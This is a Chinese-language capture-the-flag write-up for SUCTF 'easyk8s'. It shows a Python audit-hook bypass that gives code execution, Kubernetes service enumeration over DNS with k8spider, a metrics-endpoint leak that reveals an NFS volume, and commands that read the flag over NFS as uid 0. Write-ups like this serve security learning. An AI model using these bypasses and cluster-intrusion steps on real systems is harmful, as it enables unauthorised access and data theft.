### SUCTF - easyk8s

#### Python Audit Hook RCE

```
DEBUG=True  # open debug
import os,sys
op = print
def print(*args):
  t = sys._getframe(1).f_locals['audit_functions']
  t["os.system"]['ban']= False
  op(t)
  return op(*args)

os.system("ls") ## RCE 
```

当然这里也可以 _posixprocess.fork_exec 进行绕过

#### Kubernetes 信息泄漏 

https://gh-proxy.com/github.com/Esonhugh/k8spider/releases/download/v2.6.0-metric/k8spider_v2.6.0-metric_linux_amd64.tar.gz

下载新版本 k8spider 对付他，先枚举服务，直接枚举就失败， -vv 看报错可以知道，只有前几个 dns 请求正常处理了，后几个请求 全部 io timeout 

然而 dns 服务始终是正常的，所以可以猜测是 dns 服务被某些东西限制了。尝试缩小集群 server cidr 并且循环跑。

```
for i in $(seq 1 254); do ./k8spider all -c 10.43.$i.1/24 -i 20000 >> res ;done

cat res
{"Ip":"10.43.8.117","SvcDomain":"suctf-svc.default.svc.cluster.local.","SrvRecords":[{"Cname":"suctf-svc.default.svc.cluster.local.","Srv":[{"Target":"suctf-svc.default.svc.cluster.local.","Port":5000,"Priority":0,"Weight":100}]}]}
{"Ip":"10.43.109.180","SvcDomain":"metrics-server.kube-system.svc.cluster.local.","SrvRecords":[{"Cname":"metrics-server.kube-system.svc.cluster.local.","Srv":[{"Target":"metrics-server.kube-system.svc.cluster.local.","Port":443,"Priority":0,"Weight":100}]}]}
{"Ip":"10.43.116.179","SvcDomain":"kube-state-metrics.lens-metrics.svc.cluster.local.","SrvRecords":[{"Cname":"kube-state-metrics.lens-metrics.svc.cluster.local.","Srv":[{"Target":"kube-state-metrics.lens-metrics.svc.cluster.local.","Port":8080,"Priority":0,"Weight":100}]}]}
{"Ip":"10.43.140.10","SvcDomain":"nginx-ingress-controller.ingress-nginx.svc.cluster.local.","SrvRecords":[{"Cname":"nginx-ingress-controller.ingress-nginx.svc.cluster.local.","Srv":[{"Target":"nginx-ingress-controller.ingress-nginx.svc.cluster.local.","Port":80,"Priority":0,"Weight":50},{"Target":"nginx-ingress-controller.ingress-nginx.svc.cluster.local.","Port":443,"Priority":0,"Weight":50}]}]}
{"Ip":"10.43.225.93","SvcDomain":"istiod.istio-system.svc.cluster.local.","SrvRecords":[{"Cname":"istiod.istio-system.svc.cluster.local.","Srv":[{"Target":"istiod.istio-system.svc.cluster.local.","Port":15012,"Priority":0,"Weight":25},{"Target":"istiod.istio-system.svc.cluster.local.","Port":15010,"Priority":0,"Weight":25},{"Target":"istiod.istio-system.svc.cluster.local.","Port":15014,"Priority":0,"Weight":25},{"Target":"istiod.istio-system.svc.cluster.local.","Port":443,"Priority":0,"Weight":25}]}]}
```

有 server 也有服务 port

关注 kube-state-metrics.lens-metrics.svc.cluster.local 

这是个 metrics 服务，容器中有 curl，下载对应的 metrics 文本为文件

kube-state-metrics.lens-metrics.svc.cluster.local:8080/metrics

> 现在的 k8spider 可以帮助你分析这类 metrics 中的敏感信息，使得你可以极大可能把握集群整体状态。

#### 集群 NFS PV

在 metrics 信息中存在，敏感信息 nfs pv 配置。

> 发现这个 nfs 后利用的套路 k8slanparty 一模一样

```
kube_persistentvolume_info{persistentvolume="nfs-pv",storageclass="nfs-client",gce_persistent_disk_name="",ebs_volume_id="",azure_disk_name="",fc_wwids="",fc_lun="",fc_target_wwns="",iscsi_target_portal="",iscsi_iqn="",iscsi_lun="",iscsi_initiator_name="",nfs_server="0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com",nfs_path="/nfs-root/",csi_driver="",csi_volume_handle="",local_path="",local_fs="",host_path="",host_path_type=""} 1
```

nfs 服务器为 0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com，nfs 路径为 /nfs-root/

通过 socks5 代理后，尝试使用 nfs-cat 和 nfs-ls 进行访问 

即可得到 flag 在 nfs / 目录中

```
nfs-ls nfs://0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com/?uid=0
nfs-cat nfs://0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com/flag.txt?uid=0
```

或者上传一个 nfs client

例如  https://github.com/mubix/nfsclient/tree/main

但是他有点小 bug 没办法下载文件 需要修改为 https://github.com/mubix/nfsclient/blob/dadb0bf6caa10f02a617abf65c972e36389810cd/nfsclient.go#L121 为

```
f, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY, 0777)
```

这样就不会有问题了

```
nfsc 0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com:/ root:0:0 ls
+----------+-----+-----+----------+------+
| FILENAME | UID | GID | MODE     | SIZE |
+----------+-----+-----+----------+------+
| .        |   0 |   0 | 0x543c60 | 4096 |
| ..       |   0 |   0 | 0x543c60 | 4096 |
| flag.txt |   0 |   0 | 0x543c60 |   74 |
| nfs-root |   0 |   0 | 0x543c60 | 4096 |
+----------+-----+-----+----------+------+

nfsc 0c09048b03-got17.cn-hangzhou.nas.aliyuncs.com:/ root:0:0 down flag.txt 
cat flag.txt
```
